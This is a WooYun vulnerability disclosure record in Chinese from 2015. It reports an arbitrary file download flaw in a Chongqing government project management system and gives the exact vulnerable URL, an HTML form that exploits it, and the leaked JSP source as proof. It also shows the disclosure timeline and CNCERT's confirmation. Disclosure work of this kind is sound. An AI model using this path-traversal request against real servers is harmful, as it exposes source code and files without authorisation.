{"id": 39848, "wybug_id": "wooyun-2015-093111", "wybug_title": "重庆市科技计划项目管理系统文件下载漏洞（可下载jsp源码）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "猎人", "wybug_date": "2015-01-22 11:36", "wybug_open_date": "2015-03-08 11:38", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： 任意文件下载 详细说明：  漏洞url:http://xmgl.cstc.gov.cn/kwxmgl/jsp/nosession/download.jsp?filename=download.jsp\n<form name=\"Form1\" method=\"post\" action=\"http://xmgl.cstc.gov.cn/kwxmgl/jsp/nosession/download.jsp\" id=\"Form1\"> \t<input type=\"text\" name=\"filename\" value=\"download.jsp\"/>\t<input type=\"submit\" value=\"go\"/>  </form>\n   漏洞证明：  \n<%@page language=\"java\" contentType=\"application/x-msdownload\" import=\"java.io.*,java.net.*\" pageEncoding=\"gb2312\"%><%String filename = request.getParameter(\"filename\");//ÎÄ¼þÃûString filepath = this.getClass().getClassLoader().getResource(\"/\").getPath();//Â·¾¶//filepath=\"http://\"+request.getServerName()+\":\"+request.getServerPort()+request.getContextPath()+\"/\"+filename;response.reset();//¿ÉÒÔ¼ÓÒ²¿ÉÒÔ²»¼Óresponse.setContentType(\"application/x-download\");//ÉèÖÃÎªÏÂÔØapplication/x-downloadfilename = URLEncoder.encode(filename,\"UTF-8\");response.addHeader(\"Content-Disposition\",\"attachment;filename=\" + filename);//ÅÐ¶Ï·µ»ØÂ·¾¶ÓÐWEB-INFÊ±ÇÐµô£¬ÈôÊÇÃ»ÓÐ¾Í²»Ö´ÐÐ¡£if(filepath.indexOf(\"WEB-INF\")!=-1){\tfilepath = filepath.substring(0,filepath.indexOf(\"WEB-INF\")-1);}OutputStream output = null;FileInputStream fis = null;try{\toutput  = response.getOutputStream();\tfis = new FileInputStream(filepath+ \"/\"+filename);\tbyte[] b = new byte[1024];\tint i = 0;\twhile((i = fis.read(b)) > 0)\t{\t\toutput.write(b, 0, i);\t}\toutput.flush();}catch(Exception e){\tSystem.out.println(\"Error!\");\te.printStackTrace();}finally{\tif(fis != null)\t{\t\tfis.close();\t\tfis = null;\t}\tif(output != null)\t{\t\toutput.close();\t\toutput = null;\t}}%>\n   修复方案：  额，修复方案就不解释了，找开发的吧   版权声明：转载请注明来源 猎人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-01-26 15:27 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给重庆分中心，由重庆分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}